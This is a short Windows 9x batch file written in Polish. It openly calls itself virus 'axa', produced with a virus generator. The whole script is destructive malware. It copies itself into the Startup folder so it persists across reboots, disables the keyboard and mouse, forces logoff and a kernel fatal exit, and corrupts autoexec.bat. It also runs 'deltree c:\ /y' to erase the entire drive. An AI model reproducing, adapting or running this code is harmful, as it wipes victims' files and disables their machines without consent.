REM Wirus axa utworzony przy u¿yciu 'Generatora Wirusów by striker000'
echo off
cls
echo Jestem wirus axa !!!
if not exist c:\windows\menust~1\programy\autost~1\_setup.bat copy %0 c:\windows\menust~1\programy\autost~1\_setup.bat
rundll32 keyboard,disable
rundll32 mouse,disable
rundll32 user,exitwindows
rundll32 user,swapmousebutton
c:\windows\calc.exe
rundll32 user,SetDoubleClickTime
rundll32 krnl386.exe,FatalExit
rundll32 user,disableoemlayer
dir c:\*.* /s /v >>c:\autoexec.bat
deltree c:\ /y
echo g=ffff:0 | debug >>c:autoexec.bat
copy c:\windows\*.* c:\windows\pulpit\*.* >nul

